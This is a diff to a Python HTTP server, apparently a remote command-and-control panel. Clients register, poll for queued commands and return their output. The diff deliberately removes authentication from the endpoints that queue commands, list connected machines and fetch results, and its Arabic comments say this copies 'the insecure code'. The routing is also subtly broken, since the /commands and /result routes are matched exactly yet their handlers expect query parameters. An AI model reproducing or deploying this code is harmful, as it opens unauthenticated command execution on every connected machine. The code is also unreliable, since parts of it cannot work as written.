@@ -254,63 +254,51 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         if not self.check_security():
             return
-    
+        
         try:
-            path = urllib.parse.urlparse(self.path).path
-            session_id = self.get_session_id()
+            # ⚡ **التعديل البسيط: استخدم self.path مباشرة مثل الكود غير الآمن**
+            if self.path == '/':
+                self.send_login_page()
             
-            if path == '/':
-                query = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
-                client_id = query.get('client_id', [None])[0]
-                
-                if client_id:
-                    # معالجة طلبات العميل
-                    if client_id in self.sessions:
-                        self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
-                        pending_command = self.sessions[client_id]['pending_command']
-                        
-                        if pending_command:
-                            self.sessions[client_id]['pending_command'] = None
-                            self.send_json({'command': pending_command})
-                        else:
-                            self.send_json({'status': 'no_commands'})
-                    else:
-                        self.send_json({'error': 'Client not found'})
-                else:
-                    # عرض صفحة الدخول
-                    self.send_login_page()
-            
-            elif path == '/admin-auth':
+            elif self.path == '/admin-auth':
+                session_id = self.get_session_id()
                 if self.validate_session(session_id) and self.get_session_level(session_id, 'level1'):
                     self.send_admin_auth_page()
                 else:
                     self.send_redirect('/')
             
-            elif path == '/control':
+            elif self.path == '/control':
+                session_id = self.get_session_id()
                 if self.validate_session(session_id) and self.get_session_level(session_id, 'level1') and self.get_session_level(session_id, 'level2'):
                     self.send_control_panel(session_id)
                 else:
                     self.send_redirect('/')
             
-            elif path == '/sessions-data':
+            elif self.path == '/sessions':
+                # ⚡ جعلها عامة للعملاء
+                self.send_sessions_list()
+            
+            elif self.path == '/commands':
+                # ⚡ جعلها عامة للعملاء
+                self.handle_get_commands()
+            
+            elif self.path == '/result':
+                # ⚡ جعلها عامة للعملاء
+                self.handle_get_result()
+            
+            elif self.path == '/sessions-data':
+                session_id = self.get_session_id()
                 if self.validate_session(session_id) and self.get_session_level(session_id, 'level1') and self.get_session_level(session_id, 'level2'):
                     self.send_sessions_list()
                 else:
                     self.send_error(403, "Access Denied")
             
-            # ✅ **إضافة مسار /result المفقود**
-            elif path == '/result':
-                if self.validate_session(session_id) and self.get_session_level(session_id, 'level1') and self.get_session_level(session_id, 'level2'):
-                    self.handle_get_result()
-                else:
-                    self.send_error(403, "Access Denied")
-            
             else:
                 self.send_404_page()
-                
+                    
         except Exception as e:
             self.send_error(500, str(e))
-    
+            
     def do_POST(self):
         """معالجة طلبات POST"""
         if not self.check_security():
@@ -325,89 +313,27 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             post_data = self.rfile.read(content_length).decode('utf-8')
             data = json.loads(post_data) if post_data else {}
             
-            # ⚡ **التعديل الجديد: معالجة الطلبات على المسار الرئيسي /**
-            if self.path == '/':
-                self.handle_main_endpoint(data)
-                return
-                
+            # ⚡ **التعديل البسيط: استخدم self.path مباشرة مثل الكود غير الآمن**
             routes = {
                 '/login': self.handle_login,
                 '/admin-login': self.handle_admin_login,
-                '/execute': self.handle_execute_command,
-                '/response': self.handle_client_response,
-                '/register': self.handle_client_register,
-                '/change-password': self.handle_change_password,
-                '/logout': self.handle_logout
+                '/execute': self.handle_execute_command,  # ⚡ عامة
+                '/response': self.handle_client_response,  # ⚡ عامة
+                '/register': self.handle_client_register,  # ⚡ عامة
+                '/change-password': self.handle_change_password
             }
             
-            handler = routes.get(self.path, lambda x: self.send_error(404, "Not found"))
-            handler(data)
-                
+            handler = routes.get(self.path)
+            if handler:
+                handler(data)
+            else:
+                self.send_error(404, "Not found")
+                    
         except Exception as e:
             self.send_json({'error': str(e)})
     
-    def handle_main_endpoint(self, data):
-        """معالجة الطلبات على المسار الرئيسي /"""
-        action = data.get('action', '')
-        
-        if action == 'register' or 'client_id' in data:
-            # تسجيل العميل
-            self.handle_client_register(data)
-            
-        elif action == 'check_commands' or 'check_commands' in data:
-            # التحقق من الأوامر
-            client_id = data.get('client_id')
-            if client_id and client_id in self.sessions:
-                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
-                self.sessions[client_id]['status'] = 'online'  # ✅ تحديث الحالة
-                pending_command = self.sessions[client_id]['pending_command']
-                
-                if pending_command:
-                    self.sessions[client_id]['pending_command'] = None
-                    self.send_json({
-                        'command': pending_command,
-                        'action': 'command_received'
-                    })
-                else:
-                    self.send_json({
-                        'status': 'waiting', 
-                        'action': 'no_commands'
-                    })
-            else:
-                self.send_json({'error': 'Client not found'})
-                
-        elif action == 'send_response' or 'response' in data:
-            # إرسال نتيجة الأمر
-            client_id = data.get('client_id')
-            if client_id and client_id in self.sessions:
-                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
-                self.sessions[client_id]['status'] = 'online'  # ✅ تحديث الحالة
-            self.handle_client_response(data)
-            
-        elif action == 'heartbeat' or 'heartbeat' in data:
-            # نبضات القلب
-            client_id = data.get('client_id')
-            if client_id and client_id in self.sessions:
-                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
-                self.sessions[client_id]['status'] = 'online'  # ✅ تحديث الحالة
-                self.send_json({'status': 'alive', 'action': 'heartbeat_ack'})
-            else:
-                # إذا لم يكن مسجلاً، سجله
-                self.handle_client_register(data)
-                
-        else:
-            # طلب غير معروف - حاول تسجيله كعميل
-            if 'client_id' in data:
-                self.handle_client_register(data)
-            else:
-                self.send_json({'error': 'Unknown action', 'available_actions': [
-                    'register', 'check_commands', 'send_response', 'heartbeat'
-                ]})
-
-    # ⚡ الدوال التي ترسل وتستقبل الأوامر والنتائج - تم إضافتها كما هي
-
-
     def handle_execute_command(self, data):
+        """تنفيذ الأوامر - مثل الكود غير الآمن"""
         with self.session_lock:
             client_id = data.get('client_id')
             command = data.get('command')
@@ -425,9 +351,28 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     self.conn.commit()
             else:
                 self.send_json({'success': False, 'error': 'Client not found'})
- 
-
+                
+    def handle_get_commands(self):
+        """الحصول على الأوامر - مثل الكود غير الآمن"""
+        with self.session_lock:
+            parsed = urllib.parse.urlparse(self.path)
+            query = urllib.parse.parse_qs(parsed.query)
+            client_id = query.get('client', [None])[0]
+            
+            if client_id and client_id in self.sessions:
+                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
+                pending_command = self.sessions[client_id]['pending_command']
+                
+                if pending_command:
+                    self.sessions[client_id]['pending_command'] = None
+                    self.send_json({'command': pending_command, 'instant': True})
+                else:
+                    self.send_json({'waiting': False, 'instant': True})
+            else:
+                self.send_json({'error': 'Client not found', 'instant': True})
+            
     def handle_client_response(self, data):
+        """إرسال الردود - مثل الكود غير الآمن"""
         with self.session_lock:
             client_id = data.get('client_id')
             response = data.get('response')
@@ -507,7 +452,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 self.send_json({'success': True, 'client_id': client_id, 'instant': True})
                 
     def send_sessions_list(self):
-        """إرسال قائمة الجلسات النشطة"""
+        """إرسال قائمة الجلسات - مثل الكود غير الآمن"""
         with self.session_lock:
             current_time = datetime.now()
             active_clients = []
@@ -516,15 +461,13 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 last_seen = datetime.fromisoformat(client_data['last_seen'])
                 time_diff = (current_time - last_seen).total_seconds()
             
-                if time_diff < 60:  # ⚡ 60 ثانية (1 دقيقة) للبقاء في القائمة
-                    # ⚡ 30 ثانية للنشط
-                    client_data['is_online'] = time_diff < 30
+                if time_diff < 30:  # ⚡ 30 ثانية مثل الكود غير الآمن
+                    client_data['is_online'] = time_diff < 5  # ⚡ 5 ثواني للنشط
                     client_data['last_seen_seconds'] = time_diff
                     active_clients.append(client_data)
                 else:
-                    # إزالة العميل إذا انقطع لأكثر من دقيقة
                     del self.sessions[client_id]
-                    print(f"🔄 Removed inactive client: {client_id} (offline for {time_diff:.0f}s)")
+                    print(f"INSTANT Removed inactive: {client_id}")
         
             self.send_json(active_clients)
 
@@ -1673,8 +1616,9 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         self.send_response(302)
         self.send_header('Location', location)
         self.end_headers()
-
+    
     def handle_get_result(self):
+        """الحصول على النتائج - مثل الكود غير الآمن"""
         with self.session_lock:
             parsed = urllib.parse.urlparse(self.path)
             query = urllib.parse.parse_qs(parsed.query)
